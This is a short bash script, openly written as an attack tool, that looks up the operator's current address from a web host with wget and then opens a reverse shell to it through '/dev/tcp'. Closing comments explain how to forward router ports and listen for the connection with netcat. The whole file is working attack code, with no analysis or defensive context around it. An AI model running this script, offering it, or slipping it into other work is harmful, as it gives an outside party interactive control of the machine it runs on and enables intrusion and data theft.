#!/bin/bash

# Define the port which will be open to receive the connection on the attacking IP
port=8003

# Get the attacking current IP
ip=$(wget -qO- http://eudomus.webfactional.com/currentip/)
echo $ip >> currentip.log

# Open a reverse tunnel
bash -i >& /dev/tcp/$ip/$port 0>&1

# INSTRUCTIONS:
# 1. Open port 8001-8079 on your router and forward it to your device's local IP on the same port
# 2. Listen on your computer using NetCat running:
#    nc -lvv 0.0.0.0 -p 8001 (Android)
#    nc -nlvv -p 8002 (Server)
